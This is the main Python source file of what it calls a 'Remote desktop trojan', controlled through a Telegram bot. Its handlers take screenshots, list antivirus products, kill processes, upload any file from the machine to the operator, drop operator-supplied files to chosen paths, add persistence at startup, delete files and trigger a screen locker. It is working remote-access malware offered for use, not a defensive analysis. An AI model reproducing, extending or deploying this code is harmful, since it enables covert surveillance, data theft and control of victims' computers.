"""
It's main file of Remote desktop trojan
<Dependence>
    Using TelegramApi as server
</Dependence>
"""

import time
from threading import Thread
from telebot import types, TeleBot
from data import users, token as tx, settings, commands
from modules import processes, logs, speech, browser, c_windll, defender, shell, alerts, exists


class RemoteDesktop(object):
    """
    remote desktop class
    """

    @staticmethod
    def random_name():
        # Returning random filename
        return str(time.time())

    @staticmethod
    def save_file(data, path):
        # Saving file
        with open(path, 'wb') as file:
            file.write(data)
            file.close()

    @staticmethod
    def get_args(arr, rng):
        for i in range(rng):
            arr.pop(0)  # clearing elem

        return arr

    @staticmethod
    def CreateKeyboard():
        """
        Creating keyboard and adding buttons
        :return: Object <keyboard>
        """

        keyboard = types.ReplyKeyboardMarkup()
        for command in commands.keyboard_c:
            keyboard.row(f'/{command[0]}')

        return keyboard

    def __init__(self):
        """
        initiating <bot> object
        initiating components
        param: <message>
        """
        self.main_user_id = users.UserInfo.admin_id  # loading admin id
        self.bot = TeleBot(tx.tg_token)  # creating <TeleBot> object

        # Initiating components
        self.sound = speech.Sound()     # loading sound module
        self.log = logs.DataRequester()     # initiating requester
        self.keyboard = self.CreateKeyboard()   # creating keboard
        self.defenders = defender.Defenders()   # loading defenders
        self.processes = processes.Processes()  # initiating processes module
        # self.winlocker = alerts.WinLocker()
        self.alerts_m = alerts.Alert()

        # Sending status logs
        for user_id in users.UserInfo().getUsers().keys():
            self.bot.send_message(user_id, f'"{logs.get_desktop_name()}" is now online.', reply_markup=self.keyboard)

    def Activate(self):
        """
        This method activates script
        Main part of the script
        :return: None
        """

        @self.bot.message_handler(commands=commands.default['request'])
        def send_log(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, self.log.JsonLog())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['screenshot'])
        def send_screenshot(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    path = logs.get_screenshot(settings.work_path, self.random_name())
                    self.bot.send_photo(message.from_user.id, open(path, "rb"))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['getusername'])
        def get_username(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, logs.get_username())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['getdesktopname'])
        def get_desktop(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, logs.get_desktop_name())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['alltitles'])
        def get_titles(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, logs.get_all_titles())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['activetitle'])
        def get_active_title(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, logs.get_active_window())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['adduser'])
        def add_user(message):
            if message.from_user.id == self.main_user_id:
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    user_id = int(args[0])
                    username = args[1]
                    self.bot.send_message(message.from_user.id, users.UserInfo().newUser(user_id, username))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['deluser'])
        def delete_user(message):
            if message.from_user.id == self.main_user_id:
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    user_id = int(args[0])
                    self.bot.send_message(message.from_user.id, users.UserInfo().delUser(user_id))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['getusers'])
        def get_users(message):
            if message.from_user.id == self.main_user_id:
                try:
                    us = [f'{username} ({user_id})'for user_id, username in users.UserInfo().getUsers().items()]
                    self.bot.send_message(message.from_user.id, "\n".join(us))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['restart'])
        def restart(message):
            if message.from_user.id == self.main_user_id:
                try:
                    self.bot.send_message(message.from_user.id, shell.restart())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['shutdown'])
        def shutdown(message):
            if message.from_user.id == self.main_user_id:
                try:
                    self.bot.send_message(message.from_user.id, shell.shutdown())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['newbutton'])
        def new_button(message):
            if message.from_user.id == self.main_user_id:
                try:
                    text = " ".join(self.get_args(message.text.split(" "), 1))
                    self.keyboard.row(text)     # adding button
                    self.bot.send_message(message.from_user.id, f'"{text}" was added to keyboard.', reply_markup=self.keyboard)
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['defender'])
        def get_defender(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, self.defenders.GetDefenders())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['getprocesses'])
        def get_processes(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, processes.Processes.GetProcesses())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['killprocess'])
        def kill_process(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    target = " ".join(self.get_args(message.text.split(" "), 1))
                    self.bot.send_message(message.from_user.id, self.processes.KillProcess(target))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['findprocess'])
        def find_process(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    pattern = " ".join(self.get_args(message.text.split(" "), 1))
                    self.bot.send_message(message.from_user.id, self.processes.FindProcess(pattern))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['resetkeyboard'])
        def reset_keyboard(message):
            if message.from_user.id == self.main_user_id:
                try:
                    self.keyboard = self.CreateKeyboard()
                    self.bot.send_message(message.from_user.id, "Keyboard was reseted.", reply_markup=self.keyboard)
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['browser'])
        def open_browser(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    pages_count = int(args[0])
                    url = args[1]
                    self.bot.send_message(message.from_user.id, browser.OpenLink(url, pages_count))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['winlocker'])
        def winlocker(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    alerts.WinLocker().Lock(background=args[0], delay=args[1])
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['alert'])
        def alert(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    alerts.Alert().Show(delay=int(args[0]), speed=float(args[1]), text=" ".join(self.get_args(args, 2)))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['messagebox'])
        def messagebox(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    count = int(args[0])
                    title = args[2]
                    text = " ".join(self.get_args(args, 2))
                    c_windll.messagebox(title, text, count)
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['speech'])
        def speech_synthesize(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    rate = int(args[0])
                    voice_id = int(args[1])
                    volume = float(args[2])
                    text = " ".join(self.get_args(args, 3))
                    speech.Speech(rate, voice_id, volume, text).Synthesize()
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['getfile'])
        def get_file(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    args = self.get_args(message.text.split(" "), 1)
                    file_path = " ".join(args)
                    self.bot.send_document(message.from_user.id, open(file_path, "rb"))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['startup'])
        def startup_add(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, shell.startup())
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['changewp'])
        def change_workpath(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    new_path = " ".join(self.get_args(message.text.split(" "), 1))
                    if exists.is_exists(new_path):
                        settings.work_path = new_path
                    else:
                        exists.makedirs(new_path)   # creating dirs tree
                        settings.work_path = new_path

                    self.bot.send_message(message.from_user.id, f'"{new_path}" was settled as new workpath.')
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['stop'])
        def bot_stop(message):
            if message.from_user.id == self.main_user_id:
                try:
                    self.bot.send_message(message.from_user.id, "Stopping...")
                    self.bot.stop_polling()
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['removef'])
        def remove_file(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    target_path = " ".join(self.get_args(message.text.split(" "), 1))
                    self.bot.send_message(message.from_user.id, exists.remove_dir(target_path))
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(commands=commands.default['func'])
        def functions(message):
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    self.bot.send_message(message.from_user.id, commands.functions_as_string, parse_mode="HTML")
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        """
        Content types parsing
        :photo: >> wallpapers
        :audio: >> playing
        :documents: >> saving to folder from message caption
        """

        @self.bot.message_handler(content_types=['document'])
        def get_file(message):
            """
            1. Downloading file using path from message caption
            :param message:
            :return:
            """
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    install_path = message.caption
                    file_name = message.document.file_name   # filename
                    file_info = self.bot.get_file(message.document.file_id)     # getting file
                    file_data = self.bot.download_file(file_info.file_path)     # getting file data
                    full_path = f'{install_path}\\{file_name}'      # generating full path
                    self.save_file(file_data, full_path)    # saving file

                    self.bot.send_message(message, f'"{file_name}" was successfully installed.')    # sending log
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(content_types=['audio'])
        def get_audio(message):
            """
            1. Downloading sound
            2. Playing this sound
            :param message:
            :return:
            """
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    file_name = f'{self.random_name()}.mp3'  # filename
                    file_info = self.bot.get_file(message.audio.file_id)  # getting file
                    file_data = self.bot.download_file(file_info.file_path)    # getting file data
                    full_path = f'{settings.work_path}\\{file_name}'     # file path

                    self.save_file(file_data, full_path)    # saving file
                    self.bot.reply_to(message, f'File: "{full_path}" was saved.')   # reply
                    Thread(target=self.sound.Play, args=(full_path, )).start()      # starting sound process
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        @self.bot.message_handler(content_types=['photo'])
        def handle_docs_document(message):
            """
            1. Downloading image
            2. Using downloaded image as wallpapers
            :param message:
            :return:
            """
            if users.UserInfo().isValid(message.from_user.id):
                try:
                    file_info = self.bot.get_file(message.photo[len(message.photo) - 1].file_id)    # receiving file info
                    f_data = self.bot.download_file(file_info.file_path)    # file data
                    src = settings.work_path + self.random_name()   # path
                    self.save_file(f_data, src)     # saving file
                    c_windll.set_wallpapers(src)    # setting file as wallpapers

                    self.bot.reply_to(message, f'"{src}" was used as wallpapers.')
                except Exception as e:
                    self.bot.send_message(message.from_user.id, e)

        # Polling
        self.bot.polling(none_stop=settings.none_stop)


if __name__ == "__main__":
    rd = RemoteDesktop()  # Creating RD instance
    rd.Activate()   # activating remote desktop
